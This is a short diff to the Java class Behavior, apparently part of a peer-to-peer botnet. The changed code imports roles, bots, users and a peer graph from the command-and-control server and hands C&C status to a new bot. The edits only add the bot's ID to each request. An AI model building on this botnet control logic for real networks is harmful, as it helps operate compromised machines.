@@ -339,7 +339,7 @@ public class Behavior {
 		List<Pairs<Future<Pairs<Long, Integer>>, IP>> botResp = new ArrayList<Pairs<Future<Pairs<Long, Integer>>, IP>>();
 
 		for (int i = 0; i < listNegh.getSize(); i++) {
-			Pairs<IP, PublicKey> pairs=listNegh.get(i);		
+			Pairs<IP, PublicKey> pairs = listNegh.get(i);
 			Future<Pairs<Long, Integer>> result = req.getChallengeFromBot(nServ.getIdHash(), pairs.getValue1());
 			Pairs<Future<Pairs<Long, Integer>>, IP> element = new Pairs<Future<Pairs<Long, Integer>>, IP>(result,
 					pairs.getValue1());
@@ -396,28 +396,28 @@ public class Behavior {
 	public void getPower(String ip) {
 		System.out.println("Creo grafo rete P2P");
 		pServ.createNetworkP2P();
-
+		String myId = nServ.getIdHash();
 		System.out.println("Importo Database dal C&C");
 		// richiesta ruoli
-		List<Role> roles = req.getRoles(ip);
+		List<Role> roles = req.getRoles(ip,myId);
 		Collections.sort(roles, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
 		roles.forEach(role -> System.out.println("Ruolo: " + role));
 		rServ.saveAll(roles);
 
 		// richiesta bots
-		List<Bot> bots = req.getBots(ip);
+		List<Bot> bots = req.getBots(ip,myId);
 		Collections.sort(bots, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
 		bots.forEach(bot -> System.out.println("Bot: " + bot));
 		bServ.saveAll(bots);
 
 		// richiesta users
-		List<User> users = req.getUser(ip);
+		List<User> users = req.getUser(ip,myId);
 		Collections.sort(users, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
 		users.forEach(user -> System.out.println("Utenti: " + user));
 		uServ.saveAll(users);
 
 		// prendo grafo
-		List<String> graph = req.getPeers(ip);
+		List<String> graph = req.getPeers(ip,myId);
 
 		graph.forEach(e -> System.out.println("Archi: " + e));
 		// informo cc vecchio che spnp ready
@@ -441,7 +441,7 @@ public class Behavior {
 		System.out.println("Aggiorno grafo rete P2P con quello del C&C");
 		pServ.updateNetworkP2P(edge, vertex);
 		// avvisa cec che se ready
-		Boolean b = req.ready(ip);
+		Boolean b = req.ready(ip,myId);
 		if ((b != null) && (b)) {
 			System.out.println("SONO IL NUOVO C&C");
 			eng.setCommandandconquerStatus(true);
